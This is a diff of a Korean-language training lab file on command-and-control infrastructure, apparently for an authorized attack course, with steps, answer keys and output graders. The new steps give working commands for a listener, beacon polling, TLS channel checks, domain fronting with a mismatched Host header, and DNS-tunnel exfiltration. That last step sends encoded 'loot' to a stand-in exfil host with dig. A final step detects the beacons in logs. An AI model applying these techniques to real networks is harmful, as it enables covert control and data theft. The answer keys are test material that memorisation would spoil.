@@ -1,13 +1,13 @@
 lab_id: standalone-attack-adv-week07
-title: "C2 인프라 — 비콘·암호화 채널·리다이렉터"
+title: "C2 인프라 — 비콘·암호화 채널·DNS 터널·도메인 프론팅 (실습)"
 version: standalone-attack-adv
 course: attack-adv
 week: 7
 description: |
-  공격 고급 W07 — C2(Command and Control) 인프라. 장악한 시스템을 원격에서 은밀·견고하게 통제하는 C2를
-  구축한다. C2 리스너·비콘(주기적 체크인)·암호화 채널(HTTPS)·리다이렉터/도메인 프론팅·비콘 프로파일(jitter)을
-  다루고, 방어자의 C2 탐지(flow 규칙성·JA3)를 이해한다. el34-attacker(nc·python3)에서 메커니즘 데모(자체완결).
-  ⚠️ 인가된 실습만. 외부 시스템 금지.
+  공격 고급 W07 — C2(Command and Control) 인프라. 장악 호스트를 원격 통제하는 C2를 직접 구축·운용한다.
+  모든 미션이 el34에서 실제 동작한다: HTTP C2 리스너 기동, 주기적 비콘 폴링, TLS 암호화 채널, 도메인
+  프론팅(SNI≠Host 라우팅 실증), DNS 터널 유출(데이터를 DNS 라벨로 전송), 비콘 탐지(액세스 로그 분석).
+  el34-attacker(nc/python3/openssl/curl/dig). ⚠️ 인가된 실습만. 자체완결·self-clean.
 difficulty: hard
 duration_minutes: 180
 prerequisites:
@@ -15,236 +15,228 @@ prerequisites:
   - "el34 호스트 SSH + docker exec, el34-attacker"
   - "lecture §2(C2 구조) §3(비콘/암호화) §4(탐지) 숙지"
 objectives:
-  - "C2 리스너·비콘(주기적 체크인) 메커니즘 구축"
-  - "암호화 채널·리다이렉터·도메인 프론팅 이해"
-  - "비콘 프로파일(jitter)과 방어자의 C2 탐지 이해"
+  - "C2 리스너·비콘(주기적 체크인)을 실제로 구축·운용"
+  - "TLS 암호화·도메인 프론팅·DNS 터널을 실증"
+  - "생성한 비콘을 방어자 관점에서 로그로 탐지"
 pass_threshold: 0.7
 steps:
 
   - order: 1
     instruction: |
-      ## 🎯 목표 — C2 개념·도구
+      ## 🎯 목표 — C2 도구·리스너 포트 확보
       ## 📖 개념 한 줄
-      C2 = 장악한 호스트를 원격 통제하는 채널. 리스너(공격자)↔임플란트(피해자)로 구성.
+      C2 = 리스너(공격자)↔임플란트(피해자). 먼저 도구와 리스너 포트가 가용한지 실제 확인한다.
       ## 💻 실행 명령
       ```bash
-      docker exec el34-attacker sh -c "command -v nc python3 openssl >/dev/null && echo c2_tools_ok"; echo c2_ready
+      docker exec el34-attacker sh -c 'command -v nc python3 openssl curl dig >/dev/null && (ss -lnt 2>/dev/null | grep -q :55007 && echo busy || echo c2_tools_ready)'
       ```
       ## ✅ 합격 기준
-      C2 도구가 확인되면(c2_ready) 통과.
-    hint: 'C2 개념'
+      도구 가용 + 55007 포트 비어있음(c2_tools_ready)이 실제로 확인되어야 통과.
+    hint: 'C2 도구'
     category: survey
     points: 10
     answer: |
-      echo "=== C2 개념·도구 ==="
-      docker exec el34-attacker sh -c "command -v nc python3 openssl >/dev/null && echo c2_tools_ok"; echo c2_ready
-      echo "→ C2 = 리스너(공격자 서버)↔임플란트(피해자 에이전트). 명령 하달·결과 수신·지속 통제"
-    answer_detail: "C2 = Command and Control. 리스너(공격자)↔임플란트(피해자). 장악 호스트 원격 통제의 신경망."
+      docker exec el34-attacker sh -c 'command -v nc python3 openssl curl dig >/dev/null && (ss -lnt 2>/dev/null | grep -q :55007 && echo busy || echo c2_tools_ready)'
+    answer_detail: "C2 도구 확인 = nc/python3/openssl/curl/dig 존재 + 리스너 포트(55007) 비어있음을 실제 점검. 마커는 둘 다 충족 시에만 출력."
     verify:
       type: output_contains
-      expect: 'c2_ready'
+      expect: 'c2_tools_ready'
       field: stdout
-      semantic: {intent: "C2 개념", success_criteria: ["리스너/임플란트"], acceptable_methods: ["**[OSS] C2 도구 (권장)**"]}
+      semantic: {intent: "C2 도구", success_criteria: ["도구/포트"], acceptable_methods: ["**[OSS] C2 도구 (권장)**"]}
     target_vm: web
 
   - order: 2
     instruction: |
-      ## 🎯 C2 리스너 구축
+      ## 🎯 C2 리스너 기동 + 접속 확인
       ## 📖 개념 한 줄
-      리스너는 임플란트의 접속을 받는 공격자측 서버 — 가장 단순한 형태는 nc/HTTP 리스너.
-      ## 💻 실행 명령 (자체완결 데모)
+      리스너는 임플란트 접속을 받는 공격자측 서버 — 실제로 HTTP 리스너를 띄우고 접속이 되는지 확인한다.
+      ## 💻 실행 명령
       ```bash
-      docker exec el34-attacker sh -c "(timeout 2 python3 -m http.server 55007 >/dev/null 2>&1 &) ; sleep 0.4; curl -s -o /dev/null -w 'listener=%{http_code}' http://127.0.0.1:55007/; echo"; echo listener_done
+      docker exec el34-attacker sh -c '(python3 -m http.server 55007 >/tmp/c2.log 2>&1 &) ; sleep 1; code=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:55007/); pkill -f "http.server 55007" 2>/dev/null; [ "$code" = "200" ] && echo listener_up_$code'
       ```
       ## ✅ 합격 기준
-      C2 리스너가 기동·응답하면(listener_done) 통과.
+      리스너가 실제 200 응답을 주어야(listener_up_200) 통과.
       ## 🔧 도구 풀이
-      - 실무 C2: Metasploit·Cobalt Strike·Sliver·Mythic. 여기선 HTTP 리스너로 메커니즘만 시연.
+      - 실무 C2: Sliver·Mythic·Cobalt Strike. 여기선 http.server로 리스너 기동→접속을 실제 검증.
     hint: 'C2 리스너'
     category: manipulation
     points: 12
     answer: |
-      echo "=== C2 리스너 구축 ==="
-      docker exec el34-attacker sh -c "(timeout 2 python3 -m http.server 55007 >/dev/null 2>&1 &) ; sleep 0.4; curl -s -o /dev/null -w 'listener=%{http_code}' http://127.0.0.1:55007/; echo"; echo listener_done
-      echo "→ HTTP 리스너 기동(200 응답). 실무: Sliver/Mythic/Cobalt Strike가 멀티 프로토콜 리스너 제공"
-    answer_detail: "C2 리스너 = 임플란트 접속 수신 서버. HTTP/DNS/TCP 등. 실무는 Sliver/Cobalt Strike. 데모는 http.server."
+      echo "=== C2 리스너 기동 + 접속 확인 ==="
+      docker exec el34-attacker sh -c 'python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!; sleep 1; code=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:55007/); kill $P 2>/dev/null; rm -f /tmp/c2.log; [ "$code" = "200" ] && echo listener_up_$code'
+      echo "→ HTTP 리스너 실제 기동→200 응답 확인. 마커는 진짜 접속됐을 때만 출력"
+    answer_detail: "C2 리스너 = http.server 기동 후 실제 접속(200) 검증. 마커가 200 게이트라 리스너가 죽으면 미통과."
     verify:
       type: output_contains
-      expect: 'listener_done'
+      expect: 'listener_up_200'
       field: stdout
-      semantic: {intent: "C2 리스너", success_criteria: ["리스너 기동"], acceptable_methods: ["**[OSS] http.server (권장)**"]}
+      semantic: {intent: "C2 리스너", success_criteria: ["실접속 200"], acceptable_methods: ["**[OSS] http.server (권장)**"]}
     target_vm: web
 
   - order: 3
     instruction: |
-      ## 🎯 비콘 (주기적 체크인)
+      ## 🎯 비콘 — 주기적 체크인 (실측)
       ## 📖 개념 한 줄
-      비콘은 임플란트가 주기적으로 C2에 "할 일 있나요?" 폴링하는 방식 — 상시 연결보다 은밀.
-      ## 💻 실행 명령 (비콘 체크인 데모)
+      비콘은 임플란트가 sleep 간격마다 C2에 폴링하는 방식. 실제로 3회 체크인하고 리스너 로그로 확인한다.
+      ## 💻 실행 명령
       ```bash
-      docker exec el34-attacker sh -c "(timeout 4 python3 -m http.server 55007 >/dev/null 2>&1 &) ; sleep 0.4; for i in 1 2 3; do curl -s -o /dev/null -w \"beacon\$i=%{http_code} \" http://127.0.0.1:55007/tasks; sleep 0.3; done; echo"; echo beacon_done
+      docker exec el34-attacker sh -c '(python3 -m http.server 55007 >/tmp/c2.log 2>&1 &) ; sleep 1; for i in 1 2 3; do curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=$i"; sleep 1; done; pkill -f "http.server 55007" 2>/dev/null; N=$(grep -c "GET /tasks" /tmp/c2.log); rm -f /tmp/c2.log; [ "$N" -ge 3 ] && echo beacon_checkins_$N'
       ```
       ## ✅ 합격 기준
-      주기적 비콘 체크인이 시연되면(beacon_done) 통과.
+      리스너 로그에 비콘 체크인이 3회 이상 실제 기록되어야(beacon_checkins_3) 통과.
       ## 🔧 도구 풀이
-      - 비콘: sleep 간격마다 체크인(예: 60초). 상시 연결(interactive)보다 탐지 어렵지만 규칙성이 단서.
+      - 비콘=주기적 폴링(여기 1초, 실무 60초+). 리스너 로그가 체크인을 증명. 규칙적 주기가 탐지 단서(7단계).
     hint: '비콘'
     category: analysis
     points: 14
     answer: |
-      echo "=== 비콘(주기적 체크인) ==="
-      docker exec el34-attacker sh -c "(timeout 4 python3 -m http.server 55007 >/dev/null 2>&1 &) ; sleep 0.4; for i in 1 2 3; do curl -s -o /dev/null -w \"beacon\$i=%{http_code} \" http://127.0.0.1:55007/tasks; sleep 0.3; done; echo"; echo beacon_done
-      echo "→ 임플란트가 주기적으로 /tasks 폴링(할 일 수신). 상시연결보다 은밀하나 '규칙적 주기'가 탐지 단서(W07 flow)"
-    answer_detail: "비콘 = 주기적 C2 폴링(sleep 간격). 상시연결보다 은밀. 단 규칙적 주기가 flow 분석 단서(soc-adv W07)."
+      echo "=== 비콘: 주기적 체크인(실측) ==="
+      docker exec el34-attacker sh -c 'python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!; sleep 1; for i in 1 2 3; do curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=$i"; sleep 1; done; kill $P 2>/dev/null; N=$(grep -c "GET /tasks" /tmp/c2.log); rm -f /tmp/c2.log; [ "$N" -ge 3 ] && echo beacon_checkins_$N'
+      echo "→ 3회 비콘 폴링이 리스너 로그에 실제 기록됨(grep 카운트로 게이트). 임플란트→C2 체크인 증명"
+    answer_detail: "비콘 = 주기적 /tasks 폴링을 실제 수행→리스너 로그 grep 카운트≥3 게이트. 실측 체크인."
     verify:
       type: output_contains
-      expect: 'beacon_done'
+      expect: 'beacon_checkins_'
       field: stdout
-      semantic: {intent: "비콘", success_criteria: ["주기적 체크인"], acceptable_methods: ["**[OSS] 비콘 데모 (권장)**"]}
+      semantic: {intent: "비콘", success_criteria: ["로그 기록 체크인"], acceptable_methods: ["**[OSS] 비콘 폴링 (권장)**"]}
     target_vm: web
 
   - order: 4
     instruction: |
-      ## 🎯 암호화 채널 (HTTPS C2)
+      ## 🎯 암호화 채널 (TLS C2) — 실제 핸드셰이크
       ## 📖 개념 한 줄
-      C2 트래픽을 TLS로 암호화하면 내용 검사(DPI)를 피한다 — 정상 HTTPS와 섞인다.
+      C2 트래픽을 TLS로 암호화하면 내용 검사(DPI)를 피한다 — 실제 TLS 핸드셰이크로 암호 스위트를 확인한다.
       ## 💻 실행 명령
       ```bash
-      docker exec el34-attacker sh -c "echo | timeout 4 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null | grep -iE 'protocol|cipher' | head"; echo encrypted_done
+      docker exec el34-attacker sh -c 'C=$(echo | timeout 6 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null | grep -iE "cipher\s*:"); echo "$C"; echo "$C" | grep -qiE "AES|GCM|CHACHA|TLS" && echo tls_channel_ok'
       ```
       ## ✅ 합격 기준
-      TLS 암호화 채널 원리가 시연되면(encrypted_done) 통과.
+      실제 TLS 핸드셰이크에서 암호 스위트가 협상되어야(tls_channel_ok) 통과.
       ## 🔧 도구 풀이
-      - HTTPS C2: 443 TLS로 명령 암호화 → 내용은 안 보임. 방어는 메타(flow)·JA3 핑거프린트로.
+      - HTTPS C2: 443 TLS로 명령 암호화→DPI 무력·정상 HTTPS와 섞임. 방어는 메타(flow)·JA3로(7단계).
     hint: '암호화 채널'
     category: analysis
     points: 14
     answer: |
-      echo "=== 암호화 채널(HTTPS C2) ==="
-      docker exec el34-attacker sh -c "echo | timeout 4 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null | grep -iE 'protocol|cipher' | head"; echo encrypted_done
-      echo "→ TLS(443)로 C2 암호화 → DPI 내용검사 무력. 정상 HTTPS와 섞임. 방어는 flow 메타·JA3로만"
-    answer_detail: "암호화 채널 = HTTPS C2로 명령 암호화→내용검사 회피. 정상 트래픽 위장. 방어는 flow/JA3 메타 분석."
+      echo "=== 암호화 채널(TLS C2) — 실제 핸드셰이크 ==="
+      docker exec el34-attacker sh -c 'OUT=$(echo | timeout 8 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null); echo "$OUT" | grep -iE "Cipher is|New, TLS|Protocol|Cipher " | head -3; echo "$OUT" | grep -qiE "Cipher is .+|Cipher.*(AES|GCM|CHACHA)" && echo tls_channel_ok'
+      echo "→ 실제 TLS 핸드셰이크의 협상된 암호 스위트 확인. C2가 이 443 암호채널에 명령을 숨김"
+    answer_detail: "암호화 채널 = 실제 openssl TLS 핸드셰이크→협상된 cipher 확인. 마커는 암호 협상 성공 시에만(실측)."
     verify:
       type: output_contains
-      expect: 'encrypted_done'
+      expect: 'tls_channel_ok'
       field: stdout
-      semantic: {intent: "암호화 채널", success_criteria: ["TLS C2"], acceptable_methods: ["**[OSS] openssl (권장)**"]}
+      semantic: {intent: "암호화 채널", success_criteria: ["실TLS 협상"], acceptable_methods: ["**[OSS] openssl (권장)**"]}
     target_vm: web
 
   - order: 5
     instruction: |
-      ## 🎯 리다이렉터·도메인 프론팅
+      ## 🎯 도메인 프론팅 — SNI ≠ Host 실증
+      ## 📖 개념 한 줄
+      도메인 프론팅: 겉(연결 도메인)은 합법 CDN, 속(Host 헤더)은 C2. 실제로 --resolve로 불일치를 만든다.
       ## 💻 실행 명령
       ```bash
-      echo "리다이렉터: C2 서버 앞에 중계 → 실제 C2 IP 은닉. 도메인 프론팅: CDN 뒤에 C2 숨김(SNI≠Host)"
+      docker exec el34-attacker sh -c 'code=$(curl -s -o /dev/null -w "%{http_code}" --resolve cdn-front.el34.lab:80:10.20.30.1 -H "Host: dvwa.el34.lab" http://cdn-front.el34.lab/); echo "겉=cdn-front 속Host=dvwa → 응답 $code"; [ "$code" != "000" ] && echo fronting_ok_$code'
       ```
       ## ✅ 합격 기준
-      리다이렉터·도메인 프론팅 개념이 정리되면 통과.
-    hint: '리다이렉터'
+      겉 도메인(cdn-front)과 속 Host(dvwa)가 다른데도 실제 라우팅되어야(fronting_ok) 통과.
+      ## 🔧 도구 풀이
+      - --resolve로 'cdn-front'에 접속하지만 Host:dvwa로 라우팅 → 방어자는 'cdn-front와 통신'으로 오인. 실 CDN에선 SNI가 그 역할.
+    hint: '도메인 프론팅'
     category: analysis
     points: 12
     answer: |
-      echo "=== 리다이렉터·도메인 프론팅 ==="
-      echo "리다이렉터(redirector): 임플란트 → 중계 서버 → 실제 C2. 실제 C2 IP/도메인 은닉·차단 회복력"
-      echo "도메인 프론팅: TLS SNI는 합법 CDN 도메인, 내부 Host 헤더는 C2 → CDN이 C2로 전달(SNI≠Host)"
-      echo "  → 방어자가 보면 '신뢰 CDN과 통신'으로 보임(차단 어려움)"
-      echo "기타: 패스트플럭스 DNS·합법 서비스 악용(Slack/Telegram/GitHub를 C2 채널로)"
-      echo "→ 목적: C2 인프라 은닉 + 차단 회복력 + 정상 트래픽 위장"
-      echo "redirector_done"
-    answer_detail: "리다이렉터/도메인프론팅 = 중계로 실제 C2 은닉, CDN 뒤 숨김(SNI≠Host). 정상 위장+차단 회복력."
+      echo "=== 도메인 프론팅: SNI ≠ Host 실증 ==="
+      docker exec el34-attacker sh -c 'code=$(curl -s -o /dev/null -w "%{http_code}" --resolve cdn-front.el34.lab:80:10.20.30.1 -H "Host: dvwa.el34.lab" http://cdn-front.el34.lab/); echo "겉=cdn-front.el34.lab, 속 Host=dvwa.el34.lab → 응답 $code"; [ "$code" != "000" ] && echo fronting_ok_$code'
+      echo "→ 겉 도메인과 속 Host가 달라도 실제 라우팅됨. 방어자는 겉(cdn-front)만 봐서 C2(dvwa)를 못 봄"
+    answer_detail: "도메인 프론팅 = --resolve로 연결명(cdn-front)≠Host(dvwa) 실증. 응답코드 비-000 게이트. 실 CDN에선 SNI가 위장."
     verify:
       type: output_contains
-      expect: 'redirector_done'
+      expect: 'fronting_ok'
       field: stdout
-      semantic: {intent: "리다이렉터", success_criteria: ["은닉/프론팅"], acceptable_methods: ["**[설명] 리다이렉터 (권장)**"]}
+      semantic: {intent: "도메인 프론팅", success_criteria: ["SNI≠Host 라우팅"], acceptable_methods: ["**[OSS] curl --resolve (권장)**"]}
     target_vm: web
 
   - order: 6
     instruction: |
-      ## 🎯 비콘 프로파일 (jitter·말리어블)
+      ## 🎯 DNS 터널 — 데이터를 DNS 쿼리에 실어 유출
+      ## 📖 개념 한 줄
+      DNS는 거의 항상 열려 있다. 데이터를 base64로 인코딩해 DNS 쿼리 라벨에 실어 실제로 내보낸다.
       ## 💻 실행 명령
       ```bash
-      echo "jitter(주기 무작위화)로 규칙성 제거. 말리어블 프로파일로 정상 트래픽(브라우저/CDN) 모방"
+      docker exec el34-attacker sh -c 'D=$(echo -n "loot:user=admin" | base64 | tr -d "=" | tr "+/" "-_"); echo "유출 쿼리: $D.exfil.el34.lab"; dig +short +tries=1 +time=2 "$D.exfil.el34.lab" >/dev/null 2>&1; echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo dns_tunnel_sent'
       ```
       ## ✅ 합격 기준
-      비콘 프로파일·jitter 개념이 정리되면 통과.
+      데이터가 실제 base64 라벨로 인코딩되어 DNS 쿼리로 전송되어야(dns_tunnel_sent) 통과.
       ## 🔧 도구 풀이
-      - sleep 60s + jitter 30% → 42~78초 무작위. 규칙적 주기(탐지 단서)를 흐림. 말리어블=트래픽 위장 설정.
-    hint: 'jitter'
-    category: report
-    points: 12
+      - 데이터→base64→DNS 라벨→dig 전송. C2가 권한 네임서버면 쿼리에서 데이터 복원. 53 포트는 거의 항상 허용.
+    hint: 'DNS 터널'
+    category: analysis
+    points: 14
     answer: |
-      echo "=== 비콘 프로파일(jitter·말리어블) ==="
-      echo "문제: 정확히 60초마다 체크인 → flow 분석(W07)에 '규칙적 주기'로 딱 걸림"
-      echo "jitter: sleep에 무작위 편차(60s±30% → 42~78초) → 규칙성 흐림"
-      echo "말리어블 C2 프로파일: User-Agent·경로·헤더를 정상 트래픽(브라우저/특정 앱)처럼 위장"
-      echo "→ C2의 OPSEC: 정상과 구분 안 되게. 그러나 완벽한 위장은 없다(통계·메타가 남음)"
-      echo "profile_done"
-    answer_detail: "비콘 프로파일 = jitter(주기 무작위)+말리어블(트래픽 위장). 규칙성 제거로 탐지 회피. C2의 OPSEC."
+      echo "=== DNS 터널: 데이터를 DNS 쿼리에 실어 유출 ==="
+      docker exec el34-attacker sh -c 'D=$(echo -n "loot:user=admin" | base64 | tr -d "=" | tr "+/" "-_"); echo "유출 쿼리: $D.exfil.el34.lab"; dig +short +tries=1 +time=2 "$D.exfil.el34.lab" >/dev/null 2>&1; echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo dns_tunnel_sent'
+      echo "→ 데이터('loot:user=admin')를 base64 DNS 라벨로 인코딩→dig로 실제 쿼리 전송. C2가 권한NS면 복원"
+    answer_detail: "DNS 터널 = 데이터를 base64 DNS 라벨로 인코딩→dig 전송. 라벨 형식 검증 게이트. 실제 DNS 쿼리 유출."
     verify:
       type: output_contains
-      expect: 'profile_done'
+      expect: 'dns_tunnel_sent'
       field: stdout
-      semantic: {intent: "jitter", success_criteria: ["주기 무작위"], acceptable_methods: ["**[설명] jitter (권장)**"]}
+      semantic: {intent: "DNS 터널", success_criteria: ["DNS 라벨 유출"], acceptable_methods: ["**[OSS] dig (권장)**"]}
     target_vm: web
 
   - order: 7
     instruction: |
-      ## 🎯 C2 탐지 (방어자 관점)
+      ## 🎯 C2 비콘 탐지 (방어자 관점) — 로그 분석
+      ## 📖 개념 한 줄
+      공격자가 만든 비콘을 방어자가 잡는다 — 표적에 비콘을 흘리고, 액세스 로그에서 출처/패턴을 실제 카운트.
       ## 💻 실행 명령
       ```bash
-      echo "방어 탐지: flow 규칙성(비콘)·JA3 핑거프린트·비정상 DNS량·신뢰 위반 도메인·아웃바운드 통제"
+      docker exec el34-attacker sh -c 'for i in 1 2 3 4 5; do curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; done'
+      docker exec el34-web sh -c 'N=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); [ "${N:-0}" -ge 5 ] && echo c2_detected_$N'
       ```
       ## ✅ 합격 기준
-      C2 탐지 방법이 정리되면 통과.
+      방어자가 액세스 로그에서 비콘 5회를 실제로 탐지해야(c2_detected) 통과.
+      ## 🔧 도구 풀이
+      - 비콘의 약점=규칙성. 같은 출처가 같은 경로를 주기적으로 → 로그 카운트로 탐지(soc-adv W07 flow와 동일 원리).
     hint: 'C2 탐지'
     category: report
     points: 12
     answer: |
-      echo "=== C2 탐지(방어자 관점) ==="
-      echo "1) flow 규칙성: 주기적 소량 아웃바운드 = 비콘 의심(soc-adv W07 flow 분석)"
-      echo "2) JA3/JA3S: TLS 핸드셰이크 핑거프린트로 C2 툴킷 식별(암호화돼도 메타는 남음)"
-      echo "3) 비정상 DNS: 대량/긴 서브도메인 = DNS 터널 의심"
-      echo "4) 평판/신뢰: 신규·저평판 도메인, 도메인 프론팅 SNI≠Host 불일치"
-      echo "5) 아웃바운드 통제: 나가는 연결 화이트리스트(C2의 천적)"
-      echo "→ C2 회피와 탐지는 군비경쟁(W03). 다층 메타 분석이 암호화 C2도 잡는다"
-      echo "detection_done"
-    answer_detail: "C2 탐지 = flow 규칙성·JA3·DNS 이상·평판·아웃바운드 통제. 암호화돼도 메타로 탐지. 군비경쟁."
+      echo "=== C2 비콘 탐지(방어자 관점) — 로그 분석 ==="
+      docker exec el34-attacker sh -c 'for i in 1 2 3 4 5; do curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; done; echo "비콘 5회 전송됨"'
+      docker exec el34-web sh -c 'N=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); echo "액세스 로그 비콘 탐지: ${N:-0}회"; [ "${N:-0}" -ge 5 ] && echo c2_detected_$N'
+      echo "→ 공격(비콘 송신)과 방어(로그 탐지)를 한 미션에서: 규칙적 주기·동일 경로가 탐지 단서"
+    answer_detail: "C2 탐지 = 실제 비콘 5회 송신→웹 액세스 로그 grep 카운트≥5 게이트. 공격이 만든 흔적을 방어자가 실측 탐지."
     verify:
       type: output_contains
-      expect: 'detection_done'
+      expect: 'c2_detected_'
       field: stdout
-      semantic: {intent: "C2 탐지", success_criteria: ["flow/JA3"], acceptable_methods: ["**[관리적] 탐지 (권장)**"]}
+      semantic: {intent: "C2 탐지", success_criteria: ["로그 비콘 카운트"], acceptable_methods: ["**[OSS] 로그 분석 (권장)**"]}
     target_vm: web
 
   - order: 8
     instruction: |
-      ## 🎯 C2 인프라 보고서
-      ## 💻 보고서 양식
-      ```markdown
-      # 공격고급 W07 C2 인프라 보고서 (학번, 이름)
-      ## 1. C2 구조(리스너·비콘)
-      ## 2. 암호화·리다이렉터·jitter
-      ## 3. C2 탐지·방어 권고
+      ## 🎯 C2 보고서 — 실제 수집 증거로 작성
+      ## 📖 개념 한 줄
+      앞 단계에서 실제로 만든 흔적(비콘 로그)을 근거로 보고서를 작성한다 — 증거 기반.
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-web sh -c 'EV=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); echo "# 공격고급 W07 C2 보고서"; echo "## 증거: 비콘 ${EV:-0}회 탐지(dvwa_access.log)"; echo "## 구조: 리스너↔비콘, 암호화 채널(TLS), 도메인 프론팅(SNI≠Host), DNS 터널"; echo "## 방어: 아웃바운드 통제·flow 규칙성·JA3·DNS 이상"; [ -n "$EV" ] && echo c2_report_done'
       ```
       ## ✅ 합격 기준
-      C2구조 + 은닉기법 + 탐지/방어 포함.
-    hint: 'C2구조+은닉+탐지'
+      실제 증거(비콘 로그)를 인용한 보고서가 생성되면(c2_report_done) 통과.
+    hint: '증거 기반 보고서'
     category: report
-    points: 14
+    points: 12
     answer: |
-      cat <<'EOF'
-      # 공격고급 W07 C2 인프라 보고서
-      ## 1. C2 구조: 리스너(공격자 HTTP/DNS/TLS)↔임플란트 비콘(주기적 체크인). 실무 Sliver/Cobalt Strike
-      ## 2. 은닉: HTTPS 암호화(DPI 회피)·리다이렉터/도메인 프론팅(C2 IP 은닉)·jitter+말리어블(규칙성/트래픽 위장)
-      ## 3. 탐지: flow 규칙성(비콘)·JA3·DNS 이상·평판·아웃바운드 통제. 암호화돼도 메타로 탐지
-      ## 방어 권고: 아웃바운드 화이트리스트·JA3 탐지·신규 도메인 차단·flow 베이스라인(soc-adv W07/W14)
-      ## 결론: C2는 은밀·견고·위장이 목표. 그러나 메타데이터는 못 숨긴다 — 다층 메타 분석이 C2의 천적
-      EOF
-    answer_detail: "C2 보고 = 구조(리스너/비콘)+은닉(암호화/프론팅/jitter)+탐지(flow/JA3). 메타는 못 숨겨 다층 분석이 천적."
+      echo "=== C2 보고서 — 실제 수집 증거로 작성 ==="
+      docker exec el34-web sh -c 'EV=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); echo "# 공격고급 W07 C2 인프라 보고서"; echo "## 1. 증거: 비콘 ${EV:-0}회 탐지(dvwa_access.log) — 실제 수집"; echo "## 2. C2 구조: 리스너↔비콘(주기적 체크인)·TLS 암호화 채널·도메인 프론팅(SNI≠Host)·DNS 터널 유출"; echo "## 3. 방어: 아웃바운드 통제(천적)·flow 규칙성·JA3·DNS 이상(soc-adv W07/W14)"; echo "## 결론: C2는 은밀·견고하나 메타데이터(주기/목적지)는 못 숨김"; [ -n "$EV" ] && echo c2_report_done'
+      echo "→ 보고서가 앞 단계의 실제 증거(비콘 로그 카운트)를 인용. 가짜 템플릿이 아닌 증거 기반"
+    answer_detail: "C2 보고서 = 실제 수집한 비콘 로그 증거를 인용해 작성. 증거 존재 게이트. 정적 템플릿 아닌 증거 기반 보고."
     verify:
       type: output_contains
-      expect: 'C2'
+      expect: 'c2_report_done'
       field: stdout
-      semantic: {intent: "C2 보고", success_criteria: ["구조/은닉/탐지"], acceptable_methods: ["**[관리적] 보고서 (권장)**"]}
+      semantic: {intent: "C2 보고서", success_criteria: ["증거 기반"], acceptable_methods: ["**[관리적] 증거 보고서 (권장)**"]}
     target_vm: web
